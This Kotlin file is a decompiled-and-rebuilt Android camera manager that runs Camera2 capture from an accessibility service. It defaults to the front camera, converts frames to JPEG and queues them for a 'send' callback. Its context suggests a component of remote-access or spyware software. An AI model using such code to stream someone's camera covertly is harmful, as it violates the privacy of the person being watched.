package com.storm.safe.rock.manager

import android.graphics.Rect
import android.graphics.YuvImage
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.util.Size
import com.storm.safe.rock.service.MyAccessibilityService
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer
import java.util.concurrent.ArrayBlockingQueue
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.Semaphore
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Camera2 capture manager — manages camera lifecycle, frame capture, and YUV→JPEG conversion.
 *
 * Reverse-engineered from JADX: manager/C0258a0.java (551 LOC).
 *
 * Features:
 * - Camera2 API with front/back camera switching
 * - YUV_420_888 to NV21 conversion for JPEG output
 * - Semaphore-based camera access synchronization
 * - Throttled frame processing (200ms min interval)
 * - Frame queue for async sending
 * - Thread-safe start/stop with operation interval guard
 */
class C0258a0(
    private val accessibilityService: MyAccessibilityService
) {
    companion object {
        const val TAG = "CameraManager"

        const val DEFAULT_WIDTH = 640
        const val DEFAULT_HEIGHT = 480

        /** Minimum interval between camera operations */
        const val MIN_OPERATION_INTERVAL = 500L

        /** Frame throttle interval */
        const val FRAME_THROTTLE_MS = 200L

        /** Frame queue capacity */
        const val FRAME_QUEUE_CAPACITY = 15

        /** Camera open timeout */
        private const val CAMERA_OPEN_TIMEOUT_MS = 2_500L

        /** Delay between camera switch stop/start */
        private const val CAMERA_SWITCH_DELAY_MS = 200L

        /** JPEG compression quality */
        const val JPEG_QUALITY = 80

        /** Initial BAOS capacity */
        private const val BAOS_INITIAL_CAPACITY = 65536

        /**
         * Find the best camera output size <= 640x480.
         * Prefers exact 640x480, falls back to largest size within bounds.
         * JADX: m211241a1
         */
        @JvmStatic
        fun findOptimalSize(sizes: Array<Size>?): Size {
            if (sizes == null || sizes.isEmpty()) return Size(DEFAULT_WIDTH, DEFAULT_HEIGHT)

            // Look for exact match
            val exact = sizes.firstOrNull { it.width == DEFAULT_WIDTH && it.height == DEFAULT_HEIGHT }
            if (exact != null) return exact

            // Filter candidates <= 640x480 and pick largest
            val candidates = sizes.filter { it.width <= DEFAULT_WIDTH && it.height <= DEFAULT_HEIGHT }
            return candidates.maxByOrNull { it.width * it.height }
                ?: Size(DEFAULT_WIDTH, DEFAULT_HEIGHT)
        }
    }

    // ── State fields (matching JADX field layout) ──

    /** Current open camera device */
    private var cameraDevice: CameraDevice? = null

    /** ImageReader for frame capture */
    private var imageReader: ImageReader? = null

    /** Active capture session */
    private var captureSession: CameraCaptureSession? = null

    /** Background handler thread */
    private var handlerThread: HandlerThread? = null

    /** Handler for camera callbacks */
    private var handler: Handler? = null

    /** Camera system service */
    private val cameraManager: CameraManager =
        accessibilityService.getSystemService("camera") as CameraManager

    /** Current camera ID */
    private var currentCameraId: String? = null

    /** Available camera IDs */
    private var cameraIds: List<String> = emptyList()

    /** Current camera index in cameraIds */
    private var currentCameraIndex: Int = 0

    /** Camera access semaphore */
    private val cameraLock = Semaphore(1)

    /** Whether capturing frames */
    @Volatile
    var isCapturing: Boolean = false
        private set

    /** Last operation timestamp */
    @Volatile
    private var lastOperationTime: Long = 0L

    /** Minimum operation interval */
    private val minOperationInterval: Long = MIN_OPERATION_INTERVAL

    /** Whether camera is in transitioning state */
    @Volatile
    private var isTransitioning: Boolean = false

    /** Whether camera session is open */
    @Volatile
    private var isSessionOpen: Boolean = false

    /** Whether current camera is front-facing */
    @Volatile
    var isFrontFacing: Boolean = true
        private set

    /** Capture resolution width */
    private var captureWidth: Int = DEFAULT_WIDTH

    /** Capture resolution height */
    private var captureHeight: Int = DEFAULT_HEIGHT

    /** Frame queue for async processing */
    private val frameQueue = ArrayBlockingQueue<ByteArray>(FRAME_QUEUE_CAPACITY)

    /** Whether send thread is running */
    private val isSendingActive = AtomicBoolean(false)

    /** Lazy send executor */
    private val sendExecutor: ExecutorService by lazy { Executors.newSingleThreadExecutor() }

    /** Reusable BAOS for JPEG compression */
    private val jpegOutputStream = ByteArrayOutputStream(BAOS_INITIAL_CAPACITY)

    /** Reusable NV21 buffer */
    private var nv21Buffer: ByteArray? = null

    /** Last frame timestamp for throttling */
    @Volatile
    private var lastFrameTime: Long = 0L

    /** Frame callback for external consumers */
    var onFrameCallback: ((ByteArray) -> Unit)? = null

    /** Camera state callback */
    private val stateCallback = object : CameraDevice.StateCallback() {
        override fun onOpened(camera: CameraDevice) {
            cameraDevice = camera
            cameraLock.release()
            Log.d(TAG, "摄像头已打开: ${camera.id}")
        }

        override fun onDisconnected(camera: CameraDevice) {
            cameraLock.release()
            camera.close()
            cameraDevice = null
            Log.w(TAG, "摄像头已断开")
        }

        override fun onError(camera: CameraDevice, error: Int) {
            cameraLock.release()
            camera.close()
            cameraDevice = null
            Log.e(TAG, "摄像头错误: $error")
        }
    }

    /** ImageReader listener for frame processing */
    private val imageAvailableListener = ImageReader.OnImageAvailableListener { reader ->
        if (!isCapturing) {
            reader.acquireLatestImage()?.close()
            return@OnImageAvailableListener
        }
        val image = reader.acquireLatestImage() ?: return@OnImageAvailableListener
        val now = System.currentTimeMillis()
        if (now - lastFrameTime < FRAME_THROTTLE_MS) {
            image.close()
            return@OnImageAvailableListener
        }
        lastFrameTime = now
        try {
            val jpeg = convertYuvToJpeg(image)
            if (jpeg != null) {
                frameQueue.offer(jpeg)
            }
        } catch (e: Exception) {
            Log.e(TAG, "处理帧失败", e)
        } finally {
            image.close()
        }
    }

    init {
        // Initialize camera list
        try {
            val ids = cameraManager.cameraIdList.toList()
            cameraIds = ids
            // Find front camera
            for ((index, id) in ids.withIndex()) {
                val chars = cameraManager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    currentCameraIndex = index
                    currentCameraId = id
                    isFrontFacing = true
                    break
                }
            }
            // Fallback to first camera
            if (currentCameraId == null && cameraIds.isNotEmpty()) {
                currentCameraIndex = 0
                currentCameraId = cameraIds[0]
                val chars = cameraManager.getCameraCharacteristics(currentCameraId!!)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                isFrontFacing = facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT
            }
        } catch (e: Exception) {
            Log.e(TAG, "初始化摄像头列表失败", e)
        }
    }

    // ── Camera lifecycle ──

    /**
     * Close all camera resources.
     * JADX: m211242a0
     */
    fun closeCamera() {
        captureSession?.close()
        captureSession = null
        cameraDevice?.close()
        cameraDevice = null
        imageReader?.close()
        imageReader = null
    }

    /**
     * Open camera and start capture session.
     * JADX: m211243a2
     */
    @Throws(CameraAccessException::class)
    fun openCamera() {
        val cameraId = currentCameraId
        if (cameraId == null) {
            Log.e(TAG, "没有可用的摄像头")
            return
        }
        lastOperationTime = System.currentTimeMillis()
        isTransitioning = true

        val thread = HandlerThread("CameraBackground").also { it.start() }
        handlerThread = thread
        handler = Handler(thread.looper)

        try {
            if (!cameraLock.tryAcquire(CAMERA_OPEN_TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
                isTransitioning = false
                throw RuntimeException("等待摄像头超时")
            }
            cameraManager.openCamera(cameraId, stateCallback, handler)
            startFrameSendLoop()
            isSessionOpen = true
        } catch (e: SecurityException) {
            Log.e(TAG, "摄像头权限被拒绝", e)
            isTransitioning = false
        } catch (e: Exception) {
            Log.e(TAG, "启动摄像头失败", e)
            cameraLock.release()
            isTransitioning = false
        }
    }

    /**
     * Stop camera and release all resources.
     * JADX: m211244a3
     */
    @Throws(InterruptedException::class)
    fun stopCamera() {
        lastOperationTime = System.currentTimeMillis()
        isTransitioning = true
        isCapturing = false
        isSendingActive.set(false)
        frameQueue.clear()
        nv21Buffer = null
        try {
            try {
                cameraLock.acquire()
                closeCamera()
                isSessionOpen = false
            } catch (e: InterruptedException) {
                Log.e(TAG, "停止摄像头时中断", e)
            } catch (e: Exception) {
                Log.e(TAG, "停止摄像头失败", e)
            }
            handlerThread?.quitSafely()
            try {
                handlerThread?.join()
                handlerThread = null
                handler = null
            } catch (e: InterruptedException) {
                Log.e(TAG, "停止后台线程失败", e)
            }
        } finally {
            cameraLock.release()
            isTransitioning = false
        }
    }

    /**
     * Get camera info string.
     * JADX: m211245a4
     */
    @Throws(CameraAccessException::class)
    fun getCameraInfo(): String {
        return try {
            val cameraId = currentCameraId ?: return "无可用摄像头"
            val chars = cameraManager.getCameraCharacteristics(cameraId)
            val facing = chars.get(CameraCharacteristics.LENS_FACING)
            val facingStr = when {
                facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT -> "前置"
                facing != null && facing == CameraCharacteristics.LENS_FACING_BACK -> "后置"
                else -> "未知"
            }
            "$facingStr 摄像头 ($currentCameraId)"
        } catch (e: Exception) {
            "获取摄像头信息失败: ${e.message}"
        }
    }

    /**
     * Safe start camera (with operation interval guard).
     * JADX: m211246a5
     */
    fun safeStartCamera() {
        val now = System.currentTimeMillis()
        if (now - lastOperationTime < minOperationInterval) {
            Log.w(TAG, "⏳ 摄像头操作太频繁，忽略")
            return
        }
        if (isTransitioning) {
            Log.w(TAG, "⏳ 摄像头正在操作中，忽略启动请求")
            return
        }
        if (isSessionOpen) return

        val cameraId = currentCameraId
        if (cameraId == null) {
            Log.e(TAG, "没有可用的摄像头")
            return
        }
        lastOperationTime = now
        isTransitioning = true

        val thread = HandlerThread("CameraBackground").also { it.start() }
        handlerThread = thread
        handler = Handler(thread.looper)

        try {
            if (!cameraLock.tryAcquire(CAMERA_OPEN_TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
                isTransitioning = false
                throw RuntimeException("等待摄像头超时")
            }
            cameraManager.openCamera(cameraId, stateCallback, handler)
            startFrameSendLoop()
            isSessionOpen = true
            isTransitioning = false
        } catch (e: SecurityException) {
            Log.e(TAG, "摄像头权限被拒绝", e)
            isTransitioning = false
        } catch (e: Exception) {
            Log.e(TAG, "启动摄像头失败", e)
            cameraLock.release()
            isTransitioning = false
        }
    }

    /**
     * Safe stop camera (with operation interval guard).
     * JADX: m211248a7
     */
    fun safeStopCamera() {
        if (System.currentTimeMillis() - lastOperationTime < minOperationInterval) {
            Log.w(TAG, "⏳ 摄像头操作太频繁，忽略")
        } else if (isTransitioning) {
            Log.w(TAG, "⏳ 摄像头正在操作中，忽略停止请求")
        } else if (isSessionOpen) {
            stopCamera()
        }
    }

    /**
     * Start the frame send loop on the send executor.
     * JADX: m211247a6
     */
    private fun startFrameSendLoop() {
        isCapturing = true
        if (isSendingActive.getAndSet(true)) return
        sendExecutor.submit {
            while (isSendingActive.get()) {
                try {
                    val frame = frameQueue.poll(500, TimeUnit.MILLISECONDS)
                    if (frame != null) {
                        onFrameCallback?.invoke(frame)
                    }
                } catch (_: InterruptedException) {
                    break
                } catch (e: Exception) {
                    Log.e(TAG, "发送帧失败", e)
                }
            }
        }
    }

    /**
     * Switch to the next camera (front/back toggle).
     * JADX: m211249a8
     */
    @Throws(InterruptedException::class, CameraAccessException::class)
    fun switchCamera() {
        if (cameraIds.size <= 1) {
            Log.w(TAG, "只有一个或没有可用摄像头，无法切换")
            return
        }
        try {
            stopCamera()
            val nextIndex = (currentCameraIndex + 1) % cameraIds.size
            currentCameraIndex = nextIndex
            val nextId = cameraIds[nextIndex]
            currentCameraId = nextId

            val chars = cameraManager.getCameraCharacteristics(nextId)
            val facing = chars.get(CameraCharacteristics.LENS_FACING)
            isFrontFacing = facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT

            val facingStr = if (isFrontFacing) "前置" else "后置"
            Log.d(TAG, "切换到${facingStr}摄像头: $currentCameraId")

            Thread.sleep(CAMERA_SWITCH_DELAY_MS)
            openCamera()
        } catch (e: Exception) {
            Log.e(TAG, "切换摄像头失败", e)
        }
    }

    /**
     * Convert YUV_420_888 Image to JPEG byte array.
     * JADX: m211250a9 (synchronized)
     */
    @Synchronized
    fun convertYuvToJpeg(image: Image): ByteArray? {
        try {
            val width = image.width
            val height = image.height
            val yPlane = image.planes[0]
            val uPlane = image.planes[1]
            val vPlane = image.planes[2]

            val yBuffer = yPlane.buffer.duplicate().apply { rewind() }
            val uBuffer = uPlane.buffer.duplicate().apply { rewind() }
            val vBuffer = vPlane.buffer.duplicate().apply { rewind() }

            val yRowStride = yPlane.rowStride
            val uvRowStride = uPlane.rowStride
            val uvPixelStride = uPlane.pixelStride

            val nv21Size = (width * height * 3) / 2
            var buffer = nv21Buffer
            if (buffer == null || buffer.size != nv21Size) {
                buffer = ByteArray(nv21Size)
                nv21Buffer = buffer
            }

            // Copy Y plane
            var offset = 0
            for (row in 0 until height) {
                yBuffer.position(row * yRowStride)
                yBuffer.get(buffer, offset, width)
                offset += width
            }

            // Interleave V and U planes (NV21: VUVU)
            val halfHeight = height / 2
            val halfWidth = width / 2
            for (row in 0 until halfHeight) {
                for (col in 0 until halfWidth) {
                    val uvIndex = col * uvPixelStride + row * uvRowStride
                    buffer[offset] = vBuffer.get(uvIndex)
                    buffer[offset + 1] = uBuffer.get(uvIndex)
                    offset += 2
                }
            }

            // Compress to JPEG
            val yuvImage = YuvImage(buffer, android.graphics.ImageFormat.NV21, width, height, null)
            jpegOutputStream.reset()
            yuvImage.compressToJpeg(Rect(0, 0, width, height), JPEG_QUALITY, jpegOutputStream)
            return jpegOutputStream.toByteArray()
        } catch (e: Exception) {
            Log.e(TAG, "YUV转JPEG失败", e)
            return null
        }
    }

    /**
     * Release all resources.
     */
    fun release() {
        try {
            stopCamera()
        } catch (_: Exception) {}
        try {
            sendExecutor.shutdown()
        } catch (_: Exception) {}
    }
}
